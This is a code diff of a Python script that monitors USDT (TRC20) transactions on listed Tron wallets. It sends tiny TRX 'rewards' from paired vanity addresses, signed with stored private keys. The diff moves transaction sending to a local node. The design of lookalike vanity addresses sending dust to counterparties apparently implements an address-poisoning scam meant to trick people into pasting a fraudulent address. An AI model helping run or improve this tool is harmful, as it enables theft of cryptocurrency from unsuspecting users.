@@ -23,36 +23,38 @@ VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")
 TRONGRID_API_KEYS = os.getenv("TRONGRID_API_KEY", "").split(",")
 trongrid_key_cycle = itertools.cycle(TRONGRID_API_KEYS)
 
-# Main USDT contract
+# Contract addresses
 USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
-
-# Other TRC20 contract addresses you want to skip (e.g. USDC, WBTC)
 SKIP_CONTRACT_ADDRESSES = [
     USDT_CONTRACT_ADDRESS,
     "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",  # USDC
     "TXpw8TnQoAA6ZySoj53zJTZonKGr2DYZNA",  # WBTC
 ]
 
-# Add specific wallet addresses you do NOT want to send rewards to
+# Addresses to skip
 SKIP_WALLET_ADDRESSES = set([
     *WALLET_ADDRESSES,
     *VANITY_ADDRESSES,
-    "TU4vEruvZwLLkSfV9bNw12EJTPvNr7Pvaa",  # Replace with your own skip addresses
+    "TU4vEruvZwLLkSfV9bNw12EJTPvNr7Pvaa",  # Add your own skip addresses here
 ])
 
+# Validate configuration
 if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER]):
-    print("Missing email config.")
-    exit(1)
-if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
-    print("Mismatch in wallet, vanity addresses or keys.")
+    print("Missing email configuration.")
     exit(1)
 
-client = Tron(HTTPProvider(endpoint_uri="https://api.trongrid.io"))
+if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
+    print("Mismatch in address/key list lengths.")
+    exit(1)
+
+# 🔁 Hybrid Setup: Use local node for sending, Trongrid for reading
+local_node = Tron(HTTPProvider(endpoint_uri="http://localhost:8090"))
+
 last_tx_ids = {}
 
 def is_contract_address(address):
     try:
-        account_info = client.get_account(address)
+        account_info = local_node.get_account(address)
         return 'contract' in account_info and account_info['contract']
     except Exception as e:
         print(f"Error checking contract address: {e}")
@@ -67,8 +69,8 @@ def get_latest_trc20_transaction(wallet_address):
         }
 
         url = f"https://api.trongrid.io/v1/accounts/{wallet_address}/transactions/trc20?limit=1&order_by=block_timestamp,desc"
-
         response = requests.get(url, headers=headers, timeout=20)
+
         if response.status_code != 200:
             print(f"❌ TronGrid API failed. Status: {response.status_code}")
             return None
@@ -79,7 +81,6 @@ def get_latest_trc20_transaction(wallet_address):
             return None
 
         tx = txs[0]
-
         contract_address = tx.get("token_info", {}).get("address")
         if not contract_address or contract_address not in SKIP_CONTRACT_ADDRESSES:
             print("⏭ Skipping non-whitelisted TRC20 token.")
@@ -114,7 +115,7 @@ def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10
         print(f"Freezing {freeze_amount} TRX for bandwidth on {address}")
         priv_key = PrivateKey(bytes.fromhex(private_key_hex))
         txn = (
-            client.trx.freeze_balance(
+            local_node.trx.freeze_balance(
                 owner_address=address,
                 amount=int(freeze_amount * 1_000_000),
                 duration=3,
@@ -134,7 +135,7 @@ def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001"))
 
         print(f"Sending {amount} TRX from {from_address} to {to_address}")
         priv_key = PrivateKey(bytes.fromhex(priv_key_hex))
-        balance = client.get_account_balance(from_address)
+        balance = local_node.get_account_balance(from_address)
         print(f"Balance: {balance} TRX")
 
         if balance < amount:
@@ -143,8 +144,8 @@ def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001"))
             return
 
         txn = (
-            client.trx.transfer(from_address, to_address, int(amount * 1_000_000))
-            .memo(f"reward_for_usdt_interaction")
+            local_node.trx.transfer(from_address, to_address, int(amount * 1_000_000))
+            .memo("reward_for_usdt_interaction")
             .build().sign(priv_key)
         )
         result = txn.broadcast().wait()
